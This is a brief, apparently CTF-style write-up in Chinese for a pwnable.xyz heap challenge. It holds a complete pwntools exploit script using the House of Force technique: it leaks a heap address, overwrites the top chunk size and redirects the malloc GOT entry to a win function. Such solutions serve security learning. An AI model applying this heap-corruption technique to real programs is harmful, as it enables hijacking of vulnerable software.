### 分类

- [House Of Force](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-force/)



### 脚本

```python
from pwn import *
from ctypes import *

context.terminal = ['tmux', 'splitw', '-h']

p = remote("svc.pwnable.xyz", 30041)
# p = process('./challenge')


def make_note(sz, title, note):
    p.sendafter(b'> ', b'1')
    p.sendafter(b'Size: ', str.encode(str(sz)))
    p.sendafter(b'Title: ', title)
    p.sendafter(b'Note: ', note)


def edit_note(ix, data):
    p.sendafter(b'> ', b'2')
    p.sendafter(b'Note: ', str.encode(str(ix)))
    p.sendafter(b'Data: ', data)


make_note(-1, b'a', b'')
make_note(-1, b'a', b'')

edit_note(0, b'a' * (0x30 + 0x10 + 0x8))

p.sendafter(b'> ', b'3')
leak = p.recvuntil(b': ')[0x38:-2]

malloc_got = 0x601250
win_addr = 0x4008a2
top_chunk_addr = u64(leak.ljust(8, b'\x00')) + 0x20
print('top chunk:', hex(top_chunk_addr))

edit_note(1, b'\x00' * 0x38 + p64(0xffffffffffffffff))

sz = malloc_got - top_chunk_addr
sz -= 0x18 # 基础偏移
sz -= 0x10 # 修正程序逻辑的调整
print(sz)
print(hex(c_uint(sz).value))
sz -= 8 # 对齐?

make_note(sz, p64(win_addr), b'')
# gdb.attach(p)
p.interactive()

```

